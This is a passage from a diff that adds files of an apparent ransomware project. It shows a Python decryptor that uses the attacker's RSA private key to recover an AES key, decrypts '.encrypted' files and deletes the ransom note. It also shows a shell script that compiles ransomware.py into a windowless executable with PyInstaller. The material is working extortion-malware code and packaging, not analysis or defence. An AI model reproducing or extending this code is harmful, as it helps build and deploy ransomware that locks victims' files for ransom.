+print("🔓 FILE DECRYPTOR")
+print("Recover encrypted files with key from attacker")
+print("="*60)
+
+class FileDecryptor:
+    def __init__(self):
+        self.private_key = None
+        
+    def load_private_key(self, key_path="private_key.pem"):
+        """Load the attacker's private key"""
+        try:
+            with open(key_path, "rb") as f:
+                self.private_key = serialization.load_pem_private_key(
+                    f.read(),
+                    password=None,
+                    backend=default_backend()
+                )
+            print("[✓] Private key loaded")
+            return True
+        except:
+            print("[✗] Could not load private_key.pem")
+            print("    Make sure you have the key from attacker")
+            return False
+    
+    def decrypt_aes_key(self, encrypted_key_b64):
+        """Decrypt AES key using RSA private key"""
+        encrypted_key = base64.b64decode(encrypted_key_b64)
+        
+        decrypted_key = self.private_key.decrypt(
+            encrypted_key,
+            padding.OAEP(
+                mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                algorithm=hashes.SHA256(),
+                label=None
+            )
+        )
+        return decrypted_key
+    
+    def find_encrypted_files(self):
+        """Find all .encrypted files"""
+        encrypted_files = []
+        for file in os.listdir('.'):
+            if file.endswith('.encrypted'):
+                encrypted_files.append(file)
+        return encrypted_files
+    
+    def decrypt_file(self, encrypted_file, aes_key):
+        """Decrypt a single file"""
+        try:
+            # Read encrypted file
+            with open(encrypted_file, 'rb') as f:
+                data = f.read()
+            
+            # Extract IV (first 16 bytes) and encrypted data
+            iv = data[:16]
+            encrypted_data = data[16:]
+            
+            # Create AES cipher
+            cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv))
+            decryptor = cipher.decryptor()
+            
+            # Decrypt data
+            decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
+            
+            # Save decrypted file (remove .encrypted extension)
+            original_name = encrypted_file.replace('.encrypted', '')
+            with open(original_name, 'wb') as f:
+                f.write(decrypted_data)
+            
+            # Remove encrypted file
+            os.remove(encrypted_file)
+            
+            print(f"[✓] Decrypted: {original_name}")
+            return True
+            
+        except Exception as e:
+            print(f"[✗] Failed to decrypt {encrypted_file}: {e}")
+            return False
+    
+    def run(self):
+        """Main decryption process"""
+        # Load private key
+        if not self.load_private_key():
+            return
+        
+        # Get encrypted AES key from user
+        encrypted_key_b64 = input("\nEnter encrypted AES key from attacker: ").strip()
+        if not encrypted_key_b64:
+            print("No key provided!")
+            return
+        
+        # Decrypt AES key
+        try:
+            aes_key = self.decrypt_aes_key(encrypted_key_b64)
+            print("[✓] AES key decrypted successfully")
+        except:
+            print("[✗] Invalid key!")
+            return
+        
+        # Find encrypted files
+        encrypted_files = self.find_encrypted_files()
+        if not encrypted_files:
+            print("No encrypted files found!")
+            return
+        
+        print(f"\nFound {len(encrypted_files)} encrypted files")
+        
+        # Decrypt all files
+        success_count = 0
+        for file in encrypted_files:
+            if self.decrypt_file(file, aes_key):
+                success_count += 1
+        
+        print(f"\n✅ Successfully decrypted {success_count}/{len(encrypted_files)} files")
+        
+        # Remove ransom note
+        if os.path.exists("!!!READ_ME!!!.txt"):
+            os.remove("!!!READ_ME!!!.txt")
+            print("[✓] Removed ransom note")
+
+def main():
+    print("\nINSTRUCTIONS:")
+    print("1. Get the encrypted AES key from the attacker")
+    print("2. Make sure private_key.pem is in same folder")
+    print("3. Run this decryptor")
+    print("4. Enter the encrypted key when prompted")
+    print("\n" + "-"*40)
+    
+    confirm = input("Ready to decrypt? (yes/no): ").lower()
+    if confirm == 'yes':
+        decryptor = FileDecryptor()
+        decryptor.run()
+    else:
+        print("Cancelled.")
+    
+    input("\nPress Enter to exit...")
+
+if __name__ == "__main__":
+    main()
+=== File: ./Victim/src/build_exe.sh ===
+#!/bin/bash
+echo "Building ransomware executable..."
+echo ""
+
+# Install PyInstaller if needed
+pip install pyinstaller
+
+# Build the executable
+pyinstaller --onefile --noconsole ransomware.py
+
+echo ""
+echo "Done! Executable is in: dist/ransomware.exe"
+echo ""
+
